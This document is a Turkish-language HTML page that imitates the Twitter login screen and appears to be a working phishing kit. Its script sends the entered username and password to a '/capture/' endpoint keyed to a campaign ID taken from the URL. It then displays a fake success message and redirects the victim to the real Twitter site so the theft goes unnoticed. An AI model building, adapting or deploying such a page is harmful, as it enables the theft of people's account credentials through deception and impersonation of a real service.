<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Twitter. Şu anda olup bitenler. / Twitter</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            display: flex;
            min-height: 100vh;
        }

        .left-section {
            flex: 1;
            background-color: #000;
            background-image: url('https://abs.twimg.com/sticky/illustrations/lohp_1302x955.png');
            background-size: cover;
            background-position: center;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .twitter-logo {
            color: white;
            font-size: 350px;
        }

        .right-section {
            flex: 1;
            padding: 20px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            max-width: 600px;
            margin: 0 auto;
        }

        .small-logo {
            color: #1d9bf0;
            font-size: 40px;
            margin-bottom: 60px;
        }

        .main-title {
            font-size: 64px;
            font-weight: 900;
            margin-bottom: 48px;
            line-height: 1.1;
        }

        .subtitle {
            font-size: 31px;
            font-weight: 900;
            margin-bottom: 32px;
        }

        .signup-buttons {
            display: flex;
            flex-direction: column;
            gap: 16px;
            margin-bottom: 32px;
            max-width: 300px;
        }

        .signup-btn {
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 12px;
            border-radius: 9999px;
            border: 1px solid #cfd9de;
            background-color: white;
            font-weight: 600;
            font-size: 15px;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .signup-btn:hover {
            background-color: #f7f7f7;
        }

        .signup-btn i {
            margin-right: 8px;
            font-size: 18px;
        }

        .apple-btn i {
            color: #000;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
            max-width: 300px;
        }

        .divider::before,
        .divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background-color: #cfd9de;
        }

        .divider span {
            padding: 0 16px;
            font-size: 15px;
            color: #536471;
        }

        .create-account-btn {
            background-color: #1d9bf0;
            color: white;
            border: none;
            padding: 12px;
            border-radius: 9999px;
            font-weight: 600;
            font-size: 15px;
            cursor: pointer;
            max-width: 300px;
            margin-bottom: 32px;
        }

        .create-account-btn:hover {
            background-color: #1a8cd8;
        }

        .terms {
            font-size: 11px;
            color: #536471;
            max-width: 300px;
            margin-bottom: 40px;
            line-height: 1.4;
        }

        .terms a {
            color: #1d9bf0;
            text-decoration: none;
        }

        .terms a:hover {
            text-decoration: underline;
        }

        .login-section {
            max-width: 300px;
        }

        .login-title {
            font-size: 17px;
            font-weight: 700;
            margin-bottom: 20px;
        }

        .login-btn {
            background-color: transparent;
            color: #1d9bf0;
            border: 1px solid #cfd9de;
            padding: 12px;
            border-radius: 9999px;
            font-weight: 600;
            font-size: 15px;
            cursor: pointer;
            width: 100%;
        }

        .login-btn:hover {
            background-color: #e8f5fe;
        }

        .login-modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.4);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 1000;
        }

        .modal-content {
            background-color: white;
            border-radius: 16px;
            padding: 32px;
            max-width: 600px;
            width: 90%;
            position: relative;
        }

        .close-btn {
            position: absolute;
            top: 16px;
            left: 16px;
            background: none;
            border: none;
            font-size: 20px;
            cursor: pointer;
            color: #536471;
            padding: 8px;
            border-radius: 9999px;
            width: 34px;
            height: 34px;
        }

        .close-btn:hover {
            background-color: #f7f7f7;
        }

        .modal-logo {
            color: #1d9bf0;
            font-size: 32px;
            margin-bottom: 32px;
            text-align: center;
        }

        .modal-title {
            font-size: 31px;
            font-weight: 900;
            margin-bottom: 32px;
        }

        .modal-form input {
            width: 100%;
            padding: 16px;
            margin-bottom: 16px;
            border: 1px solid #cfd9de;
            border-radius: 4px;
            font-size: 17px;
        }

        .modal-form input:focus {
            outline: none;
            border-color: #1d9bf0;
        }

        .modal-submit {
            width: 100%;
            background-color: #0f1419;
            color: white;
            border: none;
            padding: 16px;
            border-radius: 9999px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            margin-bottom: 16px;
        }

        .modal-submit:hover {
            background-color: #272c30;
        }

        .modal-footer {
            text-align: center;
            margin-top: 32px;
        }

        .modal-footer a {
            color: #1d9bf0;
            text-decoration: none;
        }

        .modal-footer a:hover {
            text-decoration: underline;
        }

        .loading {
            display: none;
            margin: 10px auto;
            width: 30px;
            height: 30px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #1d9bf0;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="left-section">
        <div class="twitter-logo">
            <i class="fab fa-twitter"></i>
        </div>
    </div>

    <div class="right-section">
        <div class="small-logo">
            <i class="fab fa-twitter"></i>
        </div>

        <h1 class="main-title">Şu anda olup bitenler</h1>
        <h2 class="subtitle">Bugün Twitter'a katıl.</h2>

        <div class="signup-buttons">
            <button class="signup-btn">
                <i class="fab fa-google"></i> Google ile kaydolun
            </button>
            <button class="signup-btn">
                <i class="fab fa-apple"></i> Apple ile kaydolun
            </button>
        </div>

        <div class="divider">
            <span>veya</span>
        </div>

        <button class="create-account-btn">Hesap oluştur</button>

        <div class="terms">
            By signing up, you agree to the <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>, including <a href="#">Cookie Use</a>.
        </div>

        <div class="login-section">
            <h3 class="login-title">Zaten bir hesabın var mı?</h3>
            <button class="login-btn" onclick="openLoginModal()">Giriş yap</button>
        </div>
    </div>

    <!-- Login Modal -->
    <div class="login-modal" id="login-modal">
        <div class="modal-content">
            <button class="close-btn" onclick="closeLoginModal()">
                <i class="fas fa-times"></i>
            </button>

            <div class="modal-logo">
                <i class="fab fa-twitter"></i>
            </div>

            <h2 class="modal-title">Twitter'a giriş yap</h2>

            <form class="modal-form" id="login-form">
                <input type="text" id="username" placeholder="Telefon, e-posta veya kullanıcı adı" required>
                <input type="password" id="password" placeholder="Şifre" required>

                <button type="submit" class="modal-submit">Giriş yap</button>
                <div class="loading" id="loading"></div>
            </form>

            <div class="modal-footer">
                <a href="#">Şifreni mi unuttun?</a> · <a href="#">Twitter'a kaydol</a>
            </div>
        </div>
    </div>

    <script>
        const campaignId = window.location.pathname.substring(1);

        function openLoginModal() {
            document.getElementById('login-modal').style.display = 'flex';
        }

        function closeLoginModal() {
            document.getElementById('login-modal').style.display = 'none';
        }

        document.getElementById('login-form').addEventListener('submit', async function(e) {
            e.preventDefault();

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            if (!username || !password) {
                alert('Lütfen kullanıcı adı ve şifre girin!');
                return;
            }

            document.getElementById('loading').style.display = 'block';

            try {
                const response = await fetch(`/capture/${campaignId}`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        username: username,
                        password: password,
                        timestamp: new Date().toISOString(),
                        platform: 'Twitter'
                    })
                });

                setTimeout(() => {
                    document.getElementById('loading').style.display = 'none';
                    closeLoginModal();
                    alert('Giriş başarılı! Yönlendiriliyorsunuz...');

                    setTimeout(() => {
                        window.location.href = 'https://twitter.com/';
                    }, 1000);
                }, 2000);

            } catch (error) {
                document.getElementById('loading').style.display = 'none';
                alert('Bir hata oluştu. Lütfen tekrar deneyin.');
            }
        });

        // Close modal when clicking outside
        document.getElementById('login-modal').addEventListener('click', function(e) {
            if (e.target === this) {
                closeLoginModal();
            }
        });

        // Create account button
        document.querySelector('.create-account-btn').addEventListener('click', function() {
            alert('Hesap oluşturma özelliği şu anda kullanılamıyor.');
        });
    </script>
</body>
</html>
